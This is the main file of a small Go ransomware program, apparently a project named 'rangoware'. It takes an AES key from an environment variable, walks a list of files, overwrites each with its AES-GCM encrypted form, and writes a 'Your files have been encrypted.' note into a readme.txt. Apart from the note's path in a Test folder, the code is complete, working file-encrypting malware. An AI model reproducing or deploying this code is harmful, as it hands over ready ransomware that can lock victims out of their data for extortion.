package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"io"
	"io/ioutil"
	"os"

	"github.com/LuanSilveiraSouza/rangoware/explorer"
)

func main() {
	cryptoKey := os.Getenv("CRYPTO_KEY")

	key, err := hex.DecodeString(cryptoKey)

	if err != nil {
		panic(err)
	}

	files := explorer.MapFiles()

	for _, v := range files {
		file, err := ioutil.ReadFile(v)

		if err != nil {
			continue
		}

		encrypted, err := Encrypt(file, key)

		if err != nil {
			continue
		}

		ioutil.WriteFile(v, encrypted, 0644)
	}

	msg := "Your files have been encrypted."

	err = ioutil.WriteFile(os.Getenv("HOME")+"/Downloads/Test/readme.txt", []byte(msg), 0644)

	if err != nil {
		panic(err)
	}
}

func Encrypt(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	return cypherText, nil
}
